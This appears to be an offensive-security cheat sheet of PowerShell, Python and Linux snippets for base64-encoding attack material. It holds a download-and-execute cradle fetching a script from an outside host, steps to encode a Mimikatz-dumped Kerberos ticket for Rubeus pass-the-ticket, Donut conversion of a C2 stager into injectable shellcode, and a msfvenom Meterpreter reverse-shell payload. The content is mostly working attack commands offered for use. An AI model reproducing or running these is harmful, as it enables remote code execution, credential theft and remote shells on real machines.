```
#As A String
$OriginalCommand = "SG9va2VkIG9uIHBob25pY3Mgd29ya2VkIGZvciBtZQo=" ;
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($OriginalCommand));
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($OriginalCommand)) | Out-File -Encoding "ASCII" base64_out.txt;
```

```
$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
```

```
#Decode
[System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
```

### Convert this ticket to a base64 encoded
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
Rubeus ptt /ticket:[...snip...]
```

```
#!/usr/bin/env python
import base64
decode = raw_input (" Enter Your Encoded Data to be decode: ")
output = base64.b64decode(decode)
print (output)
f = open('base64_out.txt', 'w')
f.write(output)
f.close()
```

### Donut
Donut is a shellcode generation tool that creates position-independant shellcode payloads from .NET Assemblies. This shellcode may be used to inject the Assembly into arbitrary Windows processes.
```
donut.exe -f Downloads\GruntStager.exe -o D:\Tools\GruntStager.bin
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Pivot Point\Desktop\shellcode.bin"))

```

### From Linux
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.174.134 LPORT=53 -f raw > shellcode.bin
xxd -i shellcode.bin 
cat shellcode.bin |base64 -w 0
```
